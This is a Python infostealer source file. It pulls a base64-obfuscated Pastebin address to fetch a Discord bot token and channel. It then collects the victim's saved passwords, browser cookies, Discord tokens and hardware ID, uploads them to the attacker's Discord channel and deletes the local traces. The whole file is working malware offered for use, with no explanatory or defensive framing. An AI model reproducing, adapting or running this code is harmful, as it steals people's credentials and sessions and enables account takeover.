import resources.discord_token_grabber as discord_token_grabber
import resources.passwords_grabber as passwords_grabber
import resources.get_cookies as cookies_grabber
from base64 import b64decode
from getpass import getuser
from json import loads
import subprocess
import requests
import discord
content = b64decode(requests.get(b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3JBM1o4ZHp4')).text)
bot_token, channel_id = b64decode(loads(content)['token'])[::-1].decode(), int(b64decode(loads(content)['channel'])[::-1])
Client = discord.Client(intents=discord.Intents.all())
@Client.event
async def on_ready():
    hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
    try: passwords = passwords_grabber.grab_passwords()
    except: passwords = 'Error (or no saved passwords)'
    try: cookies_grabber.grab_cookies()
    except:
        with open(f'C:\\Users\\{getuser()}\\cookies.txt', 'w', encoding='utf-8') as error_log: error_log.write('Error (or fresh OS)')
    try: discord_grabbed = discord_token_grabber.grab_discord.initialize(True)
    except Exception as error: discord_grabbed = 'error -> ' + str(error)
    with open(f'C:\\Users\\{getuser()}\\cookies.txt', 'r', encoding='utf-8') as copy_cookies: cookies = copy_cookies.readlines()
    with open(f'C:\\Users\\{getuser()}\\{hwid}.txt', 'w', encoding='utf-8') as save_results: save_results.write('Passwords:\n' + str(passwords) + '\n\n\nDiscord:\n' + ('\n---\n'.join(discord_grabbed) if discord_grabbed[:5] != 'error' else discord_grabbed) + '\n\n\nCookies:\n' + ''.join(cookies))
    await Client.get_channel(channel_id).send(file=discord.File(f'C:\\Users\\{getuser()}\\{hwid}.txt', filename=f'{hwid}.txt')); subprocess.run(f'del C:\\Users\\{getuser()}\\{hwid}.txt', shell=True); subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
Client.run(bot_token)
